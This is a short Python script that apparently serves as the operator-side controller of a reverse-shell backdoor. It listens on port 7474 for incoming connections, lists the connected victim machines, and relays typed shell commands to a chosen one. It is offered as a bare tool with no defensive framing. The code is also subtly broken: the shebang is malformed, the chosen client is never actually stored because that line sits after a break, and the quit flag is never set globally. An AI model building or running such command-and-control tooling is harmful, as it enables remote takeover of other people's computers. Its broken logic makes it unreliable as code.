#/usr/bin/env python3
# -*-coding: utf-8 -*

import socket
import threading



clientList = []				#
curClient = None			#
quitThread = False			#
lock = threading.Lock()


#
def shell_ctrl(socket, addr):
	while True:
		com = input(str(addr[0]) + ':~#')
		if com == '!ch':
			select_client()
			return
		if com == '!q':
			quitThread = True
			print('--------------------* Connection has ended* ---------------------------')
			exit(0)
		socket.send(com.encode('utf-8'))
		data = socket.recv(1024)
		print(data.decode('utf-8'))


def select_client():
	global clientList
	global curClient
	print('---------------------* The Current is connected to the cllient: *-----------------------')
	for i in range(len(clientList)):
		print('[%i]-> %s' % (i, str(clientList[i][1][0])))
	print('Please select a client!')

	while True:
		num = input('client num: ')
		if int(num) >= len(clientList):
			print('Please input a corrent num!')
			continue
		else:
			break

		curClient =clientList[int(num)]

		print('=' * 80)
		print(' ' * 20 + 'Client Shell from add:', curClient[1][0])
		print('=' * 80)


def wait_connect(sk):
	global clientList
	while not quitThread:
		if len(clientList) == 0:
			print('Waiting for the connection......')
		sock, addr = sk.accept()
		print('New client %s is connection!' % (addr[0]))
		lock.acquire()
		clientList.append((sock, addr))
		lock.release()

def main():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('0.0.0.0', 7474))
	s.listen(1024)

	t = threading.Thread(target=wait_connect, args=(s,))
	t.start()

	while True:
		if len(clientList) > 0:
			select_client()			#
			shell_ctrl(curClient[0], curClient[1]) 	#

if __name__ == '__main__':
	main()